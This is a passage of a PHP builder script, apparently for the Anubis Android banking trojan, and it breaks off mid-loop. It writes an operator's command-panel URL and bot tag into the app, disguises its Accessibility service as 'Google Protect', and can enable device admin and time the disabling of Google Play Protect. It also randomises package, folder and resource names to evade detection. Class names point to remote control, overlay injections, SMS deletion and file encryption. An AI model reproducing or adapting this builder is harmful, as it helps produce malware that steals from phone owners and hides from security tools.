<?php
class functions
{
	function randString()
	{
		$chars = 'qwertyuiopasdfghjklzxcvbnm';
		$numChars = strlen($chars);
		$string = '';
		$length = rand(3, 16);
		for ($i = 0;$i < $length;$i++)
		{
			$string .= substr($chars, rand(1, $numChars) - 1, 1);
		}
		return $string;
	}
	
	function saveFile($base64_string, $output_file)
	{
		$ifp = fopen($output_file, "wb");
		fwrite($ifp, $base64_string);
		fclose($ifp);
		return ($output_file);
	}

	function clear()
	{
		system("rm -r tmp/build/anubisSource");
	}

	function replaceTextFile($pathFile, $text, $replaceText)
	{
		$textFile = file_get_contents($pathFile); //read
		$textFile = str_replace($text, $replaceText, $textFile); //replace Text
		file_put_contents($pathFile, $textFile); //save
		
	}

	function getFiles($path)
	{
		$dir = opendir($path);
		$array = array();
		$var = 0;
		while ($file = readdir($dir))
		{
			if(!is_dir("$path/$file") && $file != '.' && $file != '..')
			{
				$array[$var] = "$path/$file"; // echo ."</br>";
				$var++;
			}
		}
		return $array;
	}
	
	

	function build($nameapp, $url, $keytraff, $tag, $admindev, $RequestAccessibility,
				$Accessibility, $secondsPlayProtect, $urlsite, $icon, $twitter, $crypt = false, $debug = false, $task_filename = "")
	{
		
		echo <<<PHP
START BUILD
name app: $nameapp
url: $url
key for traff: $keytraff
tag: $tag
use dev.admin: $admindev
use acsb: $RequestAccessibility
acsb srv name: $Accessibility
disable protect after: $secondsPlayProtect sec
show url on start: $urlsite
icon name: $icon
twitter url: $twitter
use apk wrapper: $crypt
PHP;


		$mmm = array(
			"jgfdkg",
			"dgfdfhgsdg",
			"fdhsfdgdfg",
			"dfghsdfghadfg",
			"dfhadfg",
			"rywretgdfh",
			"adsfhaedhdfh",
			"sFHADFSGADFH",
			"sfhadsfg",
			"adfhnbadxcvbdfbadvbdf"
		);

		if(file_exists("crypt.php"))
			include "crypt.php";
		else
			include "web/crypt.php";

		system("rm -R tmp/build/");
		system("mkdir tmp/build/");
		system("cp -r source/anubisSource tmp/build/anubisSource");
		system("cp -r source/anubisCrypt tmp/build/anubisCrypt");
		system("chmod -R 777 tmp/build/");
		$rootDir = getcwd(); // .../mybuilder/
		$pathMainCode = "tmp/build/anubisSource/app/src/main";
		$pathMainCodeCrypt = "tmp/build/anubisCrypt/app/src/main";

		//~ $pathIcon = $icon;
		
		//$crypt=true;
		//-----Sert-----
		$ran1 = $this->randString();
		$ran2 = $this->randString();
		//~ $sign_tool = "keytool -genkey -v -keystore tmp/build/sert -alias key0 -keyalg RSA -keysize 2048
		//~ -validity 10000 -storepass 123123 -keypass 123123 -dname \"CN=$ran1,O=$ran2,C=US\"";
		
		$sign_tool = "keytool -genkey -noprompt -v -keyalg RSA -keysize 2048 -validity 10000 -alias key0 -keystore {$rootDir}/tmp/build/sert -storepass 123123 -keypass 123123 -dname \"CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, S=Unknown, C=Unknown\"";
		system($sign_tool);

// $icon = "Viber"  web/app_icons/Viber/mipmap-hdpi  mipmap-mdpi  mipmap-xhdpi  mipmap-xxhdpi  mipmap-xxxhdpi/ic_launcher.png

	//~ foreach(array("mipmap-hdpi","mipmap-mdpi","mipmap-xhdpi","mipmap-xxhdpi","mipmap-xxxhdpi") as $stype)
	//~ {
		//~ $srcPath = "web/app_icons/$icon/$stype/ic_launcher.png";
		
		//~ $targetPath1 = "$pathMainCode/res/$stype/ic_launcher.png";
		//~ $targetPath2 = "$pathMainCodeCrypt/res/$stype/ic_launcher.png";
	//~ }
file_put_contents("/tmp/exec", "=========\n", FILE_APPEND);

$icon_hdpi = "web/app_icons/$icon/mipmap-hdpi/ic_launcher.png";
if(file_exists($icon_hdpi))
{
	system("convert $icon_hdpi -resize 72x72 $pathMainCode/res/mipmap-hdpi/ic_launcher.png");
	system("convert $icon_hdpi -resize 72x72 $pathMainCodeCrypt/res/mipmap-hdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 72x72 $pathMainCode/res/mipmap-hdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 72x72 $pathMainCodeCrypt/res/mipmap-hdpi/ic_launcher.png\n", FILE_APPEND);
}

$icon_mdpi = "web/app_icons/$icon/mipmap-mdpi/ic_launcher.png";
if(file_exists($icon_mdpi))
{
	system("convert $icon_mdpi -resize 48x84 $pathMainCode/res/mipmap-mdpi/ic_launcher.png");
	system("convert $icon_mdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-mdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_mdpi -resize 48x84 $pathMainCode/res/mipmap-mdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_mdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-mdpi/ic_launcher.png\n", FILE_APPEND);
}else{
	system("convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-mdpi/ic_launcher.png");
	system("convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-mdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-mdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-mdpi/ic_launcher.png\n", FILE_APPEND);
}

$icon_xhdpi = "web/app_icons/$icon/mipmap-xhdpi/ic_launcher.png";
if(file_exists($icon_xhdpi))
{
	system("convert $icon_xhdpi -resize 96x96 $pathMainCode/res/mipmap-xhdpi/ic_launcher.png");
	system("convert $icon_xhdpi -resize 96x96 $pathMainCodeCrypt/res/mipmap-xhdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_xhdpi -resize 96x96 $pathMainCode/res/mipmap-xhdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_xhdpi -resize 96x96 $pathMainCodeCrypt/res/mipmap-xhdpi/ic_launcher.png\n", FILE_APPEND);
}else{
	system("convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-xhdpi/ic_launcher.png");
	system("convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-xhdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-xhdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-xhdpi/ic_launcher.png\n", FILE_APPEND);
}

$icon_xxhdpi = "web/app_icons/$icon/mipmap-xxhdpi/ic_launcher.png";
if(file_exists($icon_xxhdpi))
{
	system("convert $icon_xxhdpi -resize 144x144 $pathMainCode/res/mipmap-xxhdpi/ic_launcher.png");
	system("convert $icon_xxhdpi -resize 144x144 $pathMainCodeCrypt/res/mipmap-xxhdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_xxhdpi -resize 144x144 $pathMainCode/res/mipmap-xxhdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_xxhdpi -resize 144x144 $pathMainCodeCrypt/res/mipmap-xxhdpi/ic_launcher.png\n", FILE_APPEND);
}else{
	system("convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-xxhdpi/ic_launcher.png");
	system("convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-xxhdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-xxhdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-xxhdpi/ic_launcher.png\n", FILE_APPEND);
}

$icon_xxxhdpi = "web/app_icons/$icon/mipmap-xxxhdpi/ic_launcher.png";
if(file_exists($icon_xxxhdpi))
{
	system("convert $icon_xxxhdpi -resize 192x192 $pathMainCode/res/mipmap-xxxhdpi/ic_launcher.png");
	system("convert $icon_xxxhdpi -resize 192x192 $pathMainCodeCrypt/res/mipmap-xxxhdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_xxxhdpi -resize 192x192 $pathMainCode/res/mipmap-xxxhdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_xxxhdpi -resize 192x192 $pathMainCodeCrypt/res/mipmap-xxxhdpi/ic_launcher.png\n", FILE_APPEND);
}else{
	system("convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-xxxhdpi/ic_launcher.png");
	system("convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-xxxhdpi/ic_launcher.png");
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCode/res/mipmap-xxxhdpi/ic_launcher.png\n", FILE_APPEND);
	file_put_contents("/tmp/exec", "convert $icon_hdpi -resize 48x84 $pathMainCodeCrypt/res/mipmap-xxxhdpi/ic_launcher.png\n", FILE_APPEND);
}


		$manifest = file_get_contents($pathMainCode . "/AndroidManifest.xml"); //read
		if($crypt)
		{
			$manifestCrypt = file_get_contents($pathMainCodeCrypt . "/AndroidManifest.xml"); //read
		}
		
		$manifest = str_replace("<nameApp>", $nameapp, $manifest); //Name application
		$manifest = str_replace("Google Protect", $Accessibility, $manifest); //Name Accessibility Service
		if($admindev != "0")
		{
			$manifest = str_replace("<!--ADMIN", "", $manifest);
			$manifest = str_replace("ADMIN-->", "", $manifest);
		}

		$arrayFolder = array(
			"",
			"/Activity",
			"/API",
			"/Receiver",
			"/API/Admin",
			"/API/ProcessesSDK6",
			"/API/Screenshot",
			"/API/Sound",
			"/API/Spam",
			"/socks"
		);

		//--------Rename Folder Array-----
		$arrayFolderCrypt = array(
			"API/Admin",
			"API/ProcessesSDK6",
			"API/Screenshot",
			"API/Sound",
			"API/Spam",
			"Activity",
			"API",
			"Receiver",
			"socks"
		);
		$arrayFolderCrypt2 = array(
			"API/",
			"API/",
			"API/",
			"API/",
			"API/",
			"",
			"",
			"",
			""
		);
		$indexFC = 0;

		$arrayOldFolder = array();
		$arrayNewFolder = array();

		foreach($arrayFolderCrypt as $key => $path)
		{ // Crypt array Folder!!!
			$nameNewFolder = $this->randString();
			$nameOldFolder = str_replace("API/", "", $path);

			$arrayOldFolder[$indexFC] = $nameOldFolder;
			$arrayNewFolder[$indexFC] = $nameNewFolder;
			rename("$pathMainCode/java/anubis/bot/myapplication/$path",
			"$pathMainCode/java/anubis/bot/myapplication/$arrayFolderCrypt2[$indexFC]$nameNewFolder");

			$manifest = str_replace(".$nameOldFolder.", ".$nameNewFolder.", $manifest);
			if($crypt)
			{
				$manifestCrypt = str_replace(".$nameOldFolder.", ".$nameNewFolder.", $manifestCrypt);
			}

			$indexFolderAll = 0;
			foreach($arrayFolder as $key => $i)
			{ //Rename $arrayFolder
				$arrayFolder[$indexFolderAll] = str_replace($nameOldFolder, $nameNewFolder, $arrayFolder[$indexFolderAll]);
				$indexFolderAll++;
			}
			$indexFC++;
		}
		//-------
		file_put_contents($pathMainCode . "/AndroidManifest.xml", $manifest); //save

		//-----Manifest-Crypt------
		if($crypt)
		{
			file_put_contents($pathMainCodeCrypt . "/AndroidManifest.xml", $manifestCrypt);

			$manifestCrypt = file_get_contents($pathMainCodeCrypt . "/AndroidManifest.xml"); //read
			$manifestCrypt = str_replace("<nameApp>", $nameapp, $manifestCrypt); //Name application
			$manifestCrypt = str_replace("Google Protect", $Accessibility, $manifestCrypt); //Name Accessibility Service
			if($admindev != "0")
			{
				$manifestCrypt = str_replace("<!--ADMIN", "", $manifestCrypt);
				$manifestCrypt = str_replace("ADMIN-->", "", $manifestCrypt);
			}

			//~ //----Morfing Manifest------
			//~ $arrayManufest = explode("<!--*Array*-->", $manifestCrypt);
			//~ $manifestBegin = $arrayManufest[0];
			//~ $manifestEnd = $arrayManufest[count($arrayManufest) - 1];
			//~ $arrayManufest[0] = "";
			//~ $arrayManufest[count($arrayManufest) - 1] = "";
			//~ shuffle($arrayManufest);

			//~ $AllM = $manifestBegin;
			//~ for ($i = 0;$i < count($arrayManufest);$i++)
			//~ {
				//~ $AllM = "$AllM$arrayManufest[$i]";
			//~ }
			//~ $AllM = "$AllM$manifestEnd";

			//~ //-----Morfing Permission-----
			//~ $arrayManufest = explode("<!--#Array#-->", $AllM);
			//~ $manifestBegin = $arrayManufest[0];
			//~ $manifestEnd = $arrayManufest[count($arrayManufest) - 1];
			//~ $arrayManufest[0] = "";
			//~ $arrayManufest[count($arrayManufest) - 1] = "";
			//~ shuffle($arrayManufest);

			//~ $AllM = $manifestBegin;
			//~ for ($i = 0;$i < count($arrayManufest);$i++)
			//~ {
				//~ $AllM = "$AllM$arrayManufest[$i]";
			//~ }
			//~ $AllM = "$AllM$manifestEnd";

			//~ //-----Trash Manifest------
			//~ for ($i = 0;$i < 52;$i++)
			//~ {

				//~ if(rand(0, 1) == 1)
				//~ {
					//~ $strTrash = "";
					//~ $randT = rand(0, 2);

					//~ if($randT == 0)
					//~ {
						//~ $strTrash = $this->randString();
					//~ }
					//~ else if($randT == 1)
					//~ {
						//~ $strTrash = $this->randString() . "." . $this->randString();
					//~ }
					//~ else
					//~ {
						//~ $strTrash = $this->randString() . "." . $this->randString() . "." . $this->randString();
					//~ }
					//~ $str_trash = $this->randString();
					//~ $arrayTrashM = array();

					//~ $arrayTrashM[0] = "<activity
						//~ android:name=\"anubis.bot.myapplication.$strTrash\"
						//~ android:excludeFromRecents=\"true\"
						//~ android:label=\"\"
						//~ android:launchMode=\"singleTask\" />";

					//~ $arrayTrashM[1] = "<service
						//~ android:name=\"anubis.bot.myapplication.$strTrash\"
						//~ android:enabled=\"true\"
						//~ android:exported=\"true\" />";

					//~ $arrayTrashM[2] = "<receiver
						//~ android:name=\"anubis.bot.myapplication.$strTrash\"
						//~ android:enabled=\"true\"
						//~ android:exported=\"false\" />";

					//~ $arrayTrashM[3] = "<service
						//~ android:name=\"anubis.bot.myapplication.$strTrash\"
						//~ android:exported=\"false\" />";

					//~ $arrayTrashM[4] = "<activity
						//~ android:name=\"anubis.bot.myapplication.$strTrash\"
						//~ android:icon=\"@drawable/im\"
						//~ android:label=\"\" />";

					//~ $arrayTrashM[5] = "<meta-data
						//~ android:name=\"$str_trash\"
						//~ android:value=\"anubis.bot.myapplication.$strTrash\" >
							//~ </meta-data>";

					//~ $AllM = str_replace("<!--Trash$i-->", $arrayTrashM[rand(0, 5) ], $AllM);
				//~ }
			//~ }

			//~ //-------------------------
			//~ file_put_contents($pathMainCodeCrypt . "/AndroidManifest.xml", $AllM);
			file_put_contents($pathMainCodeCrypt."/AndroidManifest.xml",$manifestCrypt);//save

		}
		//-----Utils-----------
		$utils = file_get_contents($pathMainCode . "/java/anubis/bot/myapplication/UtilsClass.java"); //read
		$utils = str_replace("<url>", $url, $utils); //URL panel
		$utils = str_replace("<urltwitter>", $twitter, $utils); //Twiiter
		//$utils = str_replace("<url1>", $url, $utils);//URL panel
		file_put_contents($pathMainCode . "/java/anubis/bot/myapplication/UtilsClass.java", $utils); //save
		//-----Constants-------
		$constants = file_get_contents($pathMainCode . "/java/anubis/bot/myapplication/Constants.java"); //read
		$constants = str_replace("<url>", $url, $constants); //URL panel
		$constants = str_replace("<key>", $keytraff, $constants); //Key Traffic
		$constants = str_replace("<tag>", $tag, $constants); //Tag bots
		$constants = str_replace("<urltwitter>", $twitter, $constants); //Twiiter
		$constants = str_replace("DeviceAdmin=0", "DeviceAdmin=$admindev", $constants); //Status Admin Device
		$constants = str_replace("StartRequest=1", "StartRequest=$RequestAccessibility", $constants);
							//Request Permission, Accessibility Service, Admin
		$constants = str_replace("Google Protect", $Accessibility, $constants); //Name Accessibility Service
		if($secondsPlayProtect != "")
		{
			$constants = str_replace("timePlayProtect=300", "timePlayProtect=$secondsPlayProtect", $constants); //time Google Play Protect
			$constants = str_replace("PlayProtect=false", "PlayProtect=true", $constants); //check Google Play Protect

		}
		else
		{
			$constants = str_replace("PlayProtect=true", "PlayProtect=false", $constants); //check Google Play Protect

		}
		if($urlsite != "")
		{
			$constants = str_replace("checkActivityImage=false", "checkActivityImage=true", $constants); //check start Image Site
			$constants = str_replace("<urlImage>", $urlsite, $constants); //URL Site Image

		}
		file_put_contents($pathMainCode . "/java/anubis/bot/myapplication/Constants.java", $constants); //save
		//----Name package------
		$arrayDefault = array(
			"anubis",
			"bot",
			"myapplication"
		);
		$arrayRandPackage = array(
			$this->randString() ,
			$this->randString() ,
			$this->randString()
		);

		$defaultPackage = "anubis.bot.myapplication";
		$newPackage = "$arrayRandPackage[0].$arrayRandPackage[1].$arrayRandPackage[2]";

		//----Name package-Crypt-----
		$arrayDefaultCrypt = array(
			"anubis",
			"bot",
			"app"
		);
		$arrayRandPackageCrypt = array(
			$this->randString() ,
			$this->randString() ,
			$this->randString()
		);
		//$arrayRandPackageCrypt = array("anubis","bot","app");//! delete
		$defaultPackageCrypt = "anubis.bot.app";
		$newPackageCrypt = "$arrayRandPackageCrypt[0].$arrayRandPackageCrypt[1].$arrayRandPackageCrypt[2]";

		rename("$pathMainCode/java/$arrayDefault[0]", "$pathMainCode/java/$arrayRandPackage[0]");
		rename("$pathMainCode/java/$arrayRandPackage[0]/$arrayDefault[1]", "$pathMainCode/java/$arrayRandPackage[0]/$arrayRandPackage[1]");
		rename("$pathMainCode/java/$arrayRandPackage[0]/$arrayRandPackage[1]/$arrayDefault[2]",
					"$pathMainCode/java/$arrayRandPackage[0]/$arrayRandPackage[1]/$arrayRandPackage[2]");

		rename("$pathMainCodeCrypt/java/$arrayDefaultCrypt[0]", "$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]");
		rename("$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayDefaultCrypt[1]",
					"$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayRandPackageCrypt[1]");

		rename("$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayRandPackageCrypt[1]/$arrayDefaultCrypt[2]",
				"$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayRandPackageCrypt[1]/$arrayRandPackageCrypt[2]");

		$this->replaceTextFile($pathMainCode . "/../../build.gradle", "=SERT=", $rootDir."/tmp/build/sert");
		$this->replaceTextFile($pathMainCode . "/../../build.gradle", "$defaultPackage", "$newPackage");
		$this->replaceTextFile($pathMainCode . "/AndroidManifest.xml", "$defaultPackage", "$newPackage");
		$this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", "$defaultPackage", "$newPackage"); //Crypt
		$this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", "$defaultPackageCrypt", "$newPackageCrypt"); //Crypt
		$this->replaceTextFile($pathMainCodeCrypt . "/../../build.gradle", "$defaultPackage", "$newPackageCrypt");

		if($crypt)
		{
			$serviceconfig = $this->randString();
			$this->replaceTextFile($pathMainCode . "/AndroidManifest.xml", "serviceconfig", "$serviceconfig"); //Crypt
			$this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", "serviceconfig", "$serviceconfig"); //Crypt
			rename($pathMainCode . "/res/xml/serviceconfig.xml", $pathMainCode . "/res/xml/" . $serviceconfig . ".xml");
			rename($pathMainCodeCrypt . "/res/xml/serviceconfig.xml", $pathMainCodeCrypt . "/res/xml/" . $serviceconfig . ".xml");

			//----Encrypt String-----
			//$string = 'Сегодня ранним "q"  dfdf "s"   пр "d" оизошло некоторое "fsojhdjsfnhoadjsfoh" "dsihfjdofs" "34234" с  mljoij';
			//~ $matches = array();

			//~ $pathProtector = "$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayRandPackageCrypt[1]/$arrayRandPackageCrypt[2]/Protector.java";
			//~ $textProtector = file_get_contents($pathProtector); //read
			//~ preg_match_all('~"([^"]*)"~u', $textProtector, $matches);
			//~ $countArray = count(explode('"', $textProtector)) / 2;

			//~ $textProtector = str_replace("Log.", "//Log.", $textProtector); //replace Text
			//~ for ($i = 0;$i < $countArray;$i++)
			//~ {
				//~ if(($matches[1][$i] != "UTF-8")
					//~ && ($matches[1][$i] != " anubis.bot.app.Protector ")
					//~ && ($matches[1][$i] != "replaceClassLoader")
					//~ && ($matches[1][$i] != "-=nameDexFile=-")
					//~ && ($matches[1][$i] != "-=DecryptFileKey=-")
					//~ && ($matches[1][$i] != "SRC_APP_CLASS_NAME")
					//~ && ($matches[1][$i] != ""))
				//~ {
					//~ $keyEn = $this->randString();
					//~ $textEn = encryptText($matches[1][$i], $keyEn);
					//~ $textProtector = str_replace("\"" . $matches[1][$i] . "\"",
									//~ "strDecRC4(\"$textEn\", \"$keyEn\")", $textProtector); //replace Text

				//~ }
				//~ //echo $matches[1][$i];
				//~ //echo "</br>";

			//~ }

			//~ for ($i = 0;$i < 10;$i++)
			//~ {
				//~ $textProtector = str_replace("/*mmm$i*/", "String asdzxc$i=\"$mmm[$i]\";", $textProtector); //replace Text

			//~ }

			//~ file_put_contents($pathProtector, $textProtector); //save

		}

		//----Replace package ------  !
		$arrayAllJavaFile = array();
		$varFile = 0;
		$pathRes = $pathMainCode . "/res/layout";

		foreach($arrayFolder as $key => $path)
		{
			foreach($this->getFiles("$pathMainCode/java/$arrayRandPackage[0]/$arrayRandPackage[1]/$arrayRandPackage[2]$path") as $key => $value)
			{
				$this->replaceTextFile($value, "$defaultPackage", "$newPackage");
				$arrayAllJavaFile[$varFile] = $value;

				$indexF = 0;
				foreach($arrayOldFolder as $key => $i)
				{

					$this->replaceTextFile($value, ".$arrayOldFolder[$indexF].", ".$arrayNewFolder[$indexF].");
					$this->replaceTextFile($value, ".$arrayRandPackage[2].$arrayOldFolder[$indexF];",
														".$arrayRandPackage[2].$arrayNewFolder[$indexF];");
					$this->replaceTextFile($value, ".API.$arrayOldFolder[$indexF];", ".API.$arrayNewFolder[$indexF];");

					$indexF++;
				}
				$varFile++;
			}
		}

		foreach($this->getFiles($pathRes) as $key => $file)
		{ // resources replace package
			$this->replaceTextFile($file, "$defaultPackage", "$newPackage");
		}

		//--CRYPT replace package---
		$arrayAllJavaFileCrypt = array();
		$varFileCrypt = 0;
		$pathResCrypt = $pathMainCodeCrypt . "/res/layout";

		foreach($this->getFiles("$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayRandPackageCrypt[1]/$arrayRandPackageCrypt[2]")
				as $key => $value)
		{
			$this->replaceTextFile($value, "$defaultPackageCrypt", "$newPackageCrypt");
			$arrayAllJavaFileCrypt[$varFileCrypt] = $value;
			$varFileCrypt++;
		}

		//****************										CRYPT  1                 *********
		//******Resorce Crypt****
		$renameResCrypt = $pathMainCodeCrypt . "/res/layout/activity2_main";
		$randNameResCrypt = $this->randString();

		rename($renameResCrypt . ".xml", $pathMainCodeCrypt . "/res/layout/" . $randNameResCrypt . ".xml");
		$this->replaceTextFile("$pathMainCodeCrypt/java/$arrayRandPackageCrypt[0]/$arrayRandPackageCrypt[1]/$arrayRandPackageCrypt[2]/MainActivity.java",
				"activity2_main", $randNameResCrypt);
		//****************
		//Rename name all class
		//~ $varPath = 0;
		//~ $nameProtector = "";
		//~ $nameMainApplication = "";
		//~ foreach($arrayAllJavaFile as $key => $pathFile)
		//~ {

			//~ $info = pathinfo($pathFile);
			//~ if(strlen($info['filename']) > 0)
			//~ {
				//~ $defaultNameFile = $info['filename'];

				//~ $newNameFile = $this->randString();

				//~ if($defaultNameFile == "Protector")
				//~ {
					//~ $nameProtector = $newNameFile;
				//~ }
				//~ if($defaultNameFile == "MainApplication")
				//~ {
					//~ $nameMainApplication = $newNameFile;
				//~ }

				//~ $newPath = str_replace("/$defaultNameFile.java", "/$newNameFile.java", $pathFile); //replace Text

				//~ //if((!preg_match("/ProcessesSDK6/",$pathFile)) && (!preg_match("/Screenshot/",$pathFile))
				//~ #&& (!preg_match("/Activity/",$pathFile)) && (!preg_match("/ServiceRAT/",$pathFile))
				//~ //&& (!preg_match("/Receiver/",$pathFile)) && (!preg_match("/socks/",$pathFile))
				//~ #&& (!preg_match("/Admin/",$pathFile)) && (!preg_match("/Spam/",$pathFile)) && (!preg_match("/Sound/",$pathFile) ) ) {
				//~ //if(preg_match("/j/",$defaultNameFile)){

				//~ if(($defaultNameFile == "Constants") || ($defaultNameFile == "UtilsClass") || ($defaultNameFile == "StoreStrisngClass11111")
				//~ || ($defaultNameFile == "StartWhileRequest") || ($defaultNameFile == "StartWhileGlobal")
				//~ || ($defaultNameFile == "ServiceToast") || ($defaultNameFile == "ServiceRAT")
				//~ || ($defaultNameFile == "ServicePlayProtectToast") || ($defaultNameFile == "ServicePedometer")
				//~ || ($defaultNameFile == "1ServiceModuleNotification") || ($defaultNameFile == "1ServiceLookScreen")
				//~ || ($defaultNameFile == "1ServiceInjections") || ($defaultNameFile == "1ServiceGeolocationNetwork")
				//~ || ($defaultNameFile == "1ServiceGeolocationGPS") || ($defaultNameFile == "ServiceFindFiles")
				//~ || ($defaultNameFile == "1ServiceDeleteSMS") || ($defaultNameFile == "ServiceCryptFiles")
				//~ || ($defaultNameFile == "ServiceCommands") || ($defaultNameFile == "1ServiceAccessibility"))
				//~ {

					//~ $matches = array();

					//~ $textFile = file_get_contents($pathFile); //read
					//~ preg_match_all('~"([^"]*)"~u', $textFile, $matches);
					//~ $countArray = count(explode('"', $textFile)) / 2;

					//~ // $textProtector = str_replace("Log.","//Log.", $textProtector);//replace Text

					//~ for ($i = 0;$i < $countArray;$i++)
					//~ {

						//~ if(($matches[1][$i] != "UTF-8") && ($matches[1][$i] != "WrongThread") && ($matches[1][$i] != "NewApi")
						//~ && ($matches[1][$i] != "Not yet implemente") && ($matches[1][$i] != "%1$.4f:%2$.4f")
						 //~ && ($matches[1][$i] != ":mipmap/ic_launcher") && ($matches[1][$i] != "/*****/")
						 //~ && (!preg_match("/Content-Disposition: form-data/", $matches[1][$i]))
						 //~ && (!preg_match("/;filename=/", $matches[1][$i])) && (!preg_match("/serverID/", $matches[1][$i]))
						 //~ && (!preg_match("/attachmentName/", $matches[1][$i])) && (!preg_match("/replaceClassLoader/", $matches[1][$i]))
						 //~ && (!preg_match("/\r\n/", $matches[1][$i])) && (!preg_match("/--/", $matches[1][$i]))
						 //~ && (!preg_match("", $matches[1][$i])) && (!preg_match("/POST/", $matches[1][$i]))
						 //~ && (!preg_match("/Connection/", $matches[1][$i])) && (!preg_match("/Keep-Alive/", $matches[1][$i]))
						 //~ && (!preg_match("/Cache-Contro/", $matches[1][$i])) && (!preg_match("/no-cache/", $matches[1][$i]))
						 //~ && (!preg_match("/Content-Type/", $matches[1][$i])) && (!preg_match("/multipart/form-data;boundary=/", $matches[1][$i]))
						 //~ && (!preg_match("/VNC\[]/", $matches[1][$i])) && (!preg_match("/getfiles/", $matches[1][$i]))
						 //~ && (!preg_match("/苏尔的开始/", $matches[1][$i])) && (!preg_match("/苏尔的开始/", $matches[1][$i]))
						 //~ && (!preg_match("//[/", $matches[1][$i])) && (!preg_match("/]/", $matches[1][$i]))
						 //~ && (!preg_match("/0:0/", $matches[1][$i])) && (!preg_match("/0/", $matches[1][$i]))
						 //~ && (strlen($matches[1][$i]) > 3) && (strlen($matches[1][$i]) <= 60)
						 //~ && (!preg_match("/$defaultNameFile/", $matches[1][$i]))
						 //~ && (!preg_match("/attachmentFileName/", $matches[1][$i]))
 //~ && ($matches[1][$i] != "GET") && ($matches[1][$i] != ""))
						//~ {

							//~ $keyEn = $this->randString();
							//~ $textEn = encryptText($matches[1][$i], $keyEn);
							//~ $textFile = str_replace("\"" . $matches[1][$i] . "\"", "str_decrypt(\"$textEn\", \"$keyEn\")", $textFile); //replace Text

						//~ }
						//~ file_put_contents($pathFile, $textFile); //save

					//~ }

				//~ }

				//~ rename($pathFile, $newPath);

				//~ $arrayAllJavaFile[$varPath] = $newPath;
				//~ $varPath++;

				//~ $this->replaceTextFile($pathMainCode . "/AndroidManifest.xml", ".$defaultNameFile", ".$newNameFile"); // rename class manifest
				//~ $this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", ".$defaultNameFile", ".$newNameFile"); // rename class manifest Crypt

				//~ if($varPath == 1)
				//~ {
					//~ $randSendSMS = $this->randString();
					//~ $this->replaceTextFile($pathMainCode . "/AndroidManifest.xml", ".SendSms\"", ".$randSendSMS\""); // rename SendSMS manifest
					//~ $this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", ".SendSms\"", ".$randSendSMS\""); // rename SendSMS manifest Crypt
					//~ for ($i = 0;$i < 10;$i++)
					//~ {
						//~ $this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", "<!--mmm$i-->",
						//~ "<service android:name=\"$mmm[$i]\" />"); // rename SendSMS manifest Crypt

					//~ }

				//~ }

				//~ foreach($arrayAllJavaFile as $key2 => $pathFile2)
				//~ {

					//~ $this->replaceTextFile($pathFile2, $defaultNameFile, $newNameFile);

					//~ foreach($this->getFiles($pathRes) as $key => $file)
					//~ { // resources replace name class
						//~ $this->replaceTextFile($file, ".$defaultNameFile\"", ".$newNameFile\"");
					//~ }
				//~ }
			//~ }
		//~ }

		//resources
		foreach($this->getFiles($pathRes) as $key => $file)
		{ // resources rename file
			$info = pathinfo($file);
			$defaultResFile = $info['filename'];

			$newResFile = $this->randString();

			//$_SERVER['DOCUMENT_ROOT'];
			$newPathRes = str_replace("/$defaultResFile.xml", "/$newResFile.xml", $file); //replace Text
			rename($file, $newPathRes);

			$fileCrypt = str_replace("anubisSource", "anubisCrypt", $file);
			$newPathRes = str_replace("anubisSource", "anubisCrypt", $newPathRes);
			rename($fileCrypt, $newPathRes);

			foreach($arrayAllJavaFile as $key2 => $value)
